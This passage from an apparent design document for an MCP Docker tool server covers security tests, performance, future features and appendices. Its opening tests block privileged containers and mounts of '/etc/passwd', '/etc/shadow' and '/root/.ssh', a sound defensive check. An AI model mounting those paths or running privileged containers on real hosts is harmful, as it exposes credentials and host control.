        await tool.execute({
            "image": "alpine",
            "privileged": True
        })

@pytest.mark.security
async def test_sensitive_path_mount_blocked():
    """Test that sensitive paths cannot be mounted."""
    tool = CreateContainerTool(docker_client)

    sensitive_paths = [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh",
    ]

    for path in sensitive_paths:
        with pytest.raises(UnsafeOperationError):
            await tool.execute({
                "image": "alpine",
                "volumes": {path: {"bind": "/mnt", "mode": "ro"}}
            })
```

---

## 7. Performance Characteristics

### 7.1 Performance Requirements

**Target Metrics**:
- Tool execution: <2s for most operations (list, inspect, create)
- Long operations: <30s (pull, build with timeout)
- Server startup: <1s
- Memory usage: <100MB idle, <500MB under load
- Concurrent operations: Support 10+ simultaneous tool calls

### 7.2 Async Design

**Architecture**:
```
┌──────────────────────────────────────────────────┐
│          MCP Protocol (Async)                    │
│  - Multiple tool calls can be in flight          │
│  - Non-blocking I/O                              │
└────────────────────┬─────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────┐
│        Tool Layer (Async Interface)              │
│  async def execute(...) -> ToolResult            │
└────────────────────┬─────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────┐
│     Docker SDK (Synchronous - Current)           │
│  - Blocks on I/O operations                      │
│  - Future: async Docker SDK                      │
└──────────────────────────────────────────────────┘
```

**Current Implementation**:
```python
async def execute(self, input_data: ToolInput) -> ToolResult:
    """Execute tool (currently blocks on Docker SDK calls)."""
    # This is async, but Docker SDK calls are synchronous
    with self.docker.acquire() as client:
        result = client.containers.list()  # Synchronous call
    return ToolResult.success_result(result)
```

**Future-Proofing**:
```python
# When async Docker SDK becomes available
async def execute(self, input_data: ToolInput) -> ToolResult:
    """Execute tool with true async Docker calls."""
    async with self.docker.acquire_async() as client:
        result = await client.containers.list()  # Async call
    return ToolResult.success_result(result)
```

### 7.3 Connection Management

**Lazy Initialization**:
```python
@property
def client(self) -> DockerClient:
    """Lazy initialization of Docker client."""
    if self._client is None:
        self._connect()  # Only connect when first needed
    return self._client
```

**Benefits**:
- Faster server startup (no connection delay)
- Handles Docker daemon unavailability gracefully
- Configuration can be validated before connection

**Trade-offs**:
- First tool call incurs connection overhead (~50-100ms)
- Connection errors happen at runtime, not startup

**Connection Reuse**:
```python
class DockerClientWrapper:
    """Reuse single Docker client connection."""

    def __init__(self, config: DockerConfig):
        self._client: DockerClient | None = None

    @contextmanager
    def acquire(self) -> Generator[DockerClient, None, None]:
        """Context manager for safe client access."""
        try:
            yield self.client  # Reuse existing connection
        except Exception:
            # Handle errors but keep connection open
            raise
```

### 7.4 Resource Management

**Memory Management**:
```python
# Limit result size for large operations
def _format_container_list(containers: list) -> list[dict]:
    """Format containers with memory efficiency."""
    return [
        {
            "id": c.id[:12],  # Short ID only
            "name": c.name,
            "status": c.status,
            "image": c.image.tags[0] if c.image.tags else None,
            # Don't include full attrs (can be large)
        }
        for c in containers
    ]
```

**Streaming for Large Data**:
```python
# Future: Stream large log files
async def stream_logs(container_id: str) -> AsyncGenerator[str, None]:
    """Stream logs in chunks."""
    for chunk in container.logs(stream=True):
        yield chunk.decode('utf-8')
        # Yield control to event loop
        await asyncio.sleep(0)
```

**Resource Limits**:
```python
class SafetyConfig(BaseSettings):
    max_concurrent_operations: int = Field(
        default=10,
        description="Maximum concurrent Docker operations",
        gt=0,
        le=100
    )
```

### 7.5 Performance Optimizations

**Caching Strategy** (Future Enhancement):
```python
# Cache frequently accessed data
@lru_cache(maxsize=100)
def get_image_info(image_id: str) -> dict:
    """Cache image metadata."""
    return client.images.get(image_id).attrs
```

**Batch Operations** (Future Enhancement):
```python
# Batch container queries
def list_containers_batch(
    container_ids: list[str]
) -> list[dict]:
    """Get multiple containers in one API call."""
    return [
        client.containers.get(cid).attrs
        for cid in container_ids
    ]
```

### 7.6 Performance Testing

**Benchmark Suite**:
```python
@pytest.mark.performance
def test_list_containers_performance(benchmark):
    """Benchmark container listing."""
    tool = ListContainersTool(docker_client)

    result = benchmark(
        lambda: asyncio.run(tool.execute({"all": False}))
    )

    # Assertions
    assert benchmark.stats.mean < 0.1  # <100ms average
    assert benchmark.stats.max < 0.5   # <500ms worst case

@pytest.mark.performance
def test_concurrent_operations(benchmark):
    """Test multiple concurrent tool calls."""
    async def concurrent_calls():
        tasks = [
            tool.execute({"all": False})
            for _ in range(10)
        ]
        return await asyncio.gather(*tasks)

    result = benchmark(lambda: asyncio.run(concurrent_calls()))
    assert benchmark.stats.mean < 1.0  # <1s for 10 concurrent calls
```

### 7.7 Performance Monitoring

**Logging Performance Metrics**:
```python
@logger.catch
async def execute(self, input_data: ToolInput) -> ToolResult:
    """Execute with performance logging."""
    start_time = time.time()

    try:
        result = await self._perform_operation(input_data)

        duration = time.time() - start_time
        logger.info(
            f"Tool {self.name} completed",
            duration_ms=int(duration * 1000),
            success=True
        )

        return result
    except Exception as e:
        duration = time.time() - start_time
        logger.error(
            f"Tool {self.name} failed",
            duration_ms=int(duration * 1000),
            error=str(e)
        )
        raise
```

---

## 8. Future Enhancements

### 8.1 Planned Features

#### 8.1.1 Docker Compose Support

**Goal**: Full docker-compose.yml management through MCP tools.

**New Tools**:
- `docker_compose_up` - Start services from compose file
- `docker_compose_down` - Stop and remove compose services
- `docker_compose_ps` - List compose services
- `docker_compose_logs` - Get logs from compose services
- `docker_compose_exec` - Execute command in compose service

**Architecture**:
```python
class ComposeManager:
    """Manage docker-compose operations."""

    def __init__(self, compose_file: Path):
        self.compose_file = compose_file
        self.project = compose.Project.from_config(compose_file)

    async def up(self, services: list[str] | None = None) -> dict:
        """Start compose services."""
        # Use compose-go or docker-compose CLI
        pass
```

**Challenges**:
- docker-compose-py is not actively maintained
- May need to use CLI wrapper or docker compose v2 API
- Complex state management

#### 8.1.2 Docker Swarm Operations

**Goal**: Support Docker Swarm orchestration.

**New Tools**:
- `docker_swarm_init` - Initialize swarm
- `docker_swarm_join` - Join node to swarm
- `docker_service_create` - Create service
- `docker_service_scale` - Scale service
- `docker_service_logs` - Get service logs
- `docker_stack_deploy` - Deploy stack from compose

**Architecture**:
```python
class SwarmManager:
    """Manage Docker Swarm operations."""

    async def create_service(
        self,
        name: str,
        image: str,
        replicas: int = 1,
    ) -> dict:
        """Create a Docker service."""
        service = client.services.create(
            image=image,
            name=name,
            mode={"Replicated": {"Replicas": replicas}}
        )
        return service.attrs
```

#### 8.1.3 Remote Docker Host Support

**Goal**: Connect to remote Docker daemons over SSH or TCP.

**Configuration**:
```python
class DockerConfig(BaseSettings):
    base_url: str = Field(
        default="unix:///var/run/docker.sock",
        description="Docker daemon URL (unix://, tcp://, ssh://)"
    )
    ssh_host: str | None = Field(default=None)
    ssh_port: int = Field(default=22)
    ssh_key_path: Path | None = Field(default=None)
```

**Implementation**:
```python
def _connect_remote(self) -> DockerClient:
    """Connect to remote Docker daemon."""
    if self.config.base_url.startswith("ssh://"):
        # Use SSH tunnel
        return docker.DockerClient(
            base_url=self.config.base_url,
            ssh_config=SSHConfig(
                host=self.config.ssh_host,
                port=self.config.ssh_port,
                key_path=self.config.ssh_key_path
            )
        )
    else:
        # Standard TCP connection
        return docker.DockerClient(base_url=self.config.base_url)
```

**Security Considerations**:
- SSH key management
- TLS certificate validation
- Network security

#### 8.1.4 Enhanced Streaming

**Goal**: Real-time progress for long-running operations.

**Build Progress**:
```python
async def build_image_with_progress(
    path: str,
    tag: str,
) -> AsyncGenerator[dict, None]:
    """Build image with streaming progress."""
    for line in client.api.build(path=path, tag=tag, stream=True):
        progress = json.loads(line.decode('utf-8'))
        yield {
            "stream": progress.get("stream", ""),
            "status": progress.get("status", ""),
            "progress": progress.get("progress", ""),
        }
```

**Pull Progress**:
```python
async def pull_image_with_progress(
    image: str,
) -> AsyncGenerator[dict, None]:
    """Pull image with streaming progress."""
    for line in client.api.pull(image, stream=True):
        progress = json.loads(line.decode('utf-8'))
        yield {
            "id": progress.get("id", ""),
            "status": progress.get("status", ""),
            "progress": progress.get("progress", ""),
        }
```

#### 8.1.5 WebSocket Transport

**Goal**: Alternative to stdio for better real-time communication.

**Architecture**:
```python
class WebSocketTransport:
    """WebSocket transport for MCP."""

    async def start(self, host: str = "localhost", port: int = 8765):
        """Start WebSocket server."""
        async with websockets.serve(self.handle_connection, host, port):
            await asyncio.Future()  # Run forever

    async def handle_connection(
        self,
        websocket: WebSocketServerProtocol,
        path: str
    ):
        """Handle WebSocket connection."""
        async for message in websocket:
            request = json.loads(message)
            response = await self.handle_request(request)
            await websocket.send(json.dumps(response))
```

**Benefits**:
- Real-time bidirectional communication
- Better support for streaming
- Can serve multiple clients
- Network accessible

**Challenges**:
- More complex deployment
- Authentication needed
- Network security

#### 8.1.6 Docker Scout Integration

**Goal**: Security scanning and vulnerability detection.

**New Tools**:
- `docker_scout_cves` - List CVEs in image
- `docker_scout_recommendations` - Get security recommendations
- `docker_scout_compare` - Compare security profiles

**Implementation**:
```python
async def scan_image_for_cves(image: str) -> dict:
    """Scan image for security vulnerabilities."""
    # Use Docker Scout CLI or API
    result = subprocess.run(
        ["docker", "scout", "cves", image, "--format", "json"],
        capture_output=True,
        text=True
    )
    return json.loads(result.stdout)
```

### 8.2 Technical Debt

**Items to Address**:

1. **Async Docker SDK**: Currently blocking on synchronous SDK
   - Wait for official async Docker SDK
   - Or implement async wrapper with thread pool

2. **Connection Pooling**: Single connection currently
   - Implement connection pool for concurrent operations
   - May improve performance under load

3. **Result Caching**: No caching currently
   - Cache frequently accessed data (images, system info)
   - Implement TTL-based cache invalidation

4. **Metrics and Telemetry**: Limited observability
   - Add Prometheus metrics
   - Track operation latency, error rates
   - Monitor resource usage

5. **Configuration Hot Reload**: Requires restart
   - Watch configuration file for changes
   - Reload safely without disrupting operations

### 8.3 Roadmap

**Version 0.2.0** (Q2 2025):
- Docker Compose basic support
- Enhanced streaming for build/pull
- Performance optimizations (caching)

**Version 0.3.0** (Q3 2025):
- Remote Docker host support (SSH, TCP)
- WebSocket transport option
- Docker Scout integration

**Version 1.0.0** (Q4 2025):
- Production-hardened
- Full Docker Compose support
- Docker Swarm operations
- Comprehensive documentation
- Performance benchmarks

**Version 2.0.0** (2026):
- Kubernetes integration (exploratory)
- Multi-host orchestration
- Advanced monitoring and metrics
- Plugin system for extensions

---

## Appendix A: Technology Justifications

### Why Python 3.11+?
- **Type Hints**: Union types with `|`, better generics
- **Performance**: 10-60% faster than Python 3.10
- **Modern Features**: `asyncio` improvements, better error messages
- **Ecosystem**: Mature Docker and MCP libraries

### Why Pydantic v2?
- **Performance**: 5-50x faster than v1 (Rust core)
- **Type Safety**: Better integration with type checkers
- **JSON Schema**: Auto-generation for MCP protocol
- **Validation**: Powerful field validators

### Why Docker SDK for Python?
- **Official**: Maintained by Docker Inc.
- **Complete**: Full Docker API coverage
- **Well-Documented**: Excellent documentation
- **Stable**: Battle-tested in production

### Why Loguru?
- **Simple**: Easy to use, minimal configuration
- **Powerful**: Structured logging, colors, rotation
- **Performance**: Fast, low overhead
- **Features**: Exception catching, lazy evaluation

### Why uv?
- **Speed**: 10-100x faster than pip
- **Modern**: Built with Rust for reliability
- **Simple**: Single tool for all package management
- **Lock Files**: Reproducible builds

### Why Ruff?
- **Speed**: 10-100x faster than traditional linters
- **Comprehensive**: Replaces 8+ tools
- **Modern**: Actively developed, Rust-based
- **Compatible**: Drop-in replacement for existing tools

### Why Pytest?
- **Standard**: De facto testing framework
- **Powerful**: Fixtures, parametrization, plugins
- **Async**: Native async/await support
- **Ecosystem**: Rich plugin ecosystem

---

## Appendix B: Code Examples

### Example: Creating a New Tool

```python
"""Example: Creating a new Docker tool."""

from pydantic import BaseModel, Field
from mcp_docker.tools.base import BaseTool, OperationSafety, ToolResult
from mcp_docker.docker.client import DockerClientWrapper

class MyToolInput(BaseModel):
    """Input schema for my tool."""
    container_id: str = Field(description="Container ID or name")
    setting: str = Field(default="default", description="Some setting")

class MyTool(BaseTool):
    """My custom Docker tool."""

    @property
    def name(self) -> str:
        return "docker_my_tool"

    @property
    def description(self) -> str:
        return "Does something useful with Docker"

    @property
    def input_model(self) -> type[MyToolInput]:
        return MyToolInput

    @property
    def safety_level(self) -> OperationSafety:
        return OperationSafety.MODERATE

    async def execute(self, input_data: MyToolInput) -> ToolResult:
        """Execute the tool."""
        try:
            # Get Docker client
            with self.docker.acquire() as client:
                # Perform operation
                container = client.containers.get(input_data.container_id)
                result = container.do_something(setting=input_data.setting)

            # Return success
            return ToolResult.success_result(
                data={"result": result},
                container_id=input_data.container_id
            )

        except Exception as e:
            # Return error
            return ToolResult.error_result(
                error=str(e),
                error_type=type(e).__name__
            )
```

### Example: Custom Validation

```python
"""Example: Custom validation for Docker resources."""

import re
from mcp_docker.utils.errors import ValidationError

NETWORK_NAME_PATTERN = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9_.-]*$')

def validate_network_name(name: str) -> str:
    """Validate Docker network name.

    Args:
        name: Network name to validate

    Returns:
        Validated network name

    Raises:
        ValidationError: If name is invalid
    """
    if not name:
        raise ValidationError("Network name cannot be empty")

    if len(name) > 255:
        raise ValidationError("Network name cannot exceed 255 characters")

    if not NETWORK_NAME_PATTERN.match(name):
        raise ValidationError(
            f"Invalid network name: {name}. "
            "Must start with alphanumeric and contain only "
            "alphanumeric, underscore, period, or hyphen characters."
        )

    return name
```

### Example: Integration Test

```python
"""Example: Integration test for container operations."""

import pytest
from mcp_docker.tools.container_tools import (
    CreateContainerTool,
    StartContainerTool,
    StopContainerTool,
    RemoveContainerTool,
)

@pytest.mark.integration
async def test_container_full_lifecycle(docker_client_wrapper, integration_test_config):
    """Test complete container lifecycle."""
    container_id = None

    try:
        # Create
        create_tool = CreateContainerTool(docker_client_wrapper)
        create_result = await create_tool.execute({
            "image": "alpine:latest",
            "name": "test-lifecycle",
            "command": ["sleep", "infinity"]
        })
        assert create_result.success
        container_id = create_result.data["container_id"]

        # Start
        start_tool = StartContainerTool(docker_client_wrapper)
        start_result = await start_tool.execute({"container_id": container_id})
        assert start_result.success
        assert start_result.data["status"] == "running"

        # Stop
        stop_tool = StopContainerTool(docker_client_wrapper)
        stop_result = await stop_tool.execute({"container_id": container_id})
        assert stop_result.success

    finally:
        # Cleanup
        if container_id:
            remove_tool = RemoveContainerTool(docker_client_wrapper)
            await remove_tool.execute({
                "container_id": container_id,
                "force": True
            })
```

---

## Appendix C: Glossary

**MCP (Model Context Protocol)**: Protocol for AI assistants to access external tools and data

**Tool**: Discrete operation exposed through MCP (e.g., list_containers)

**Resource**: Data source accessible via URI (e.g., container logs)

**Prompt**: Template that guides AI interactions

**Safety Level**: Classification of operation risk (SAFE/MODERATE/DESTRUCTIVE)

**Docker SDK**: Official Python library for Docker API

**Pydantic**: Data validation library with type hints

**Type Hint**: Python annotation specifying expected types

**Async/Await**: Python syntax for asynchronous programming

**Context Manager**: Python construct for resource management (`with` statement)

**Fixture**: Reusable test setup component (pytest)

**Mock**: Simulated object for testing

**Integration Test**: Test with real external dependencies

**Unit Test**: Test of isolated component with mocks

---

**Document Version**: 1.0
**Last Updated**: 2025-01-XX
**Maintained By**: MCP Docker Project
**License**: MIT
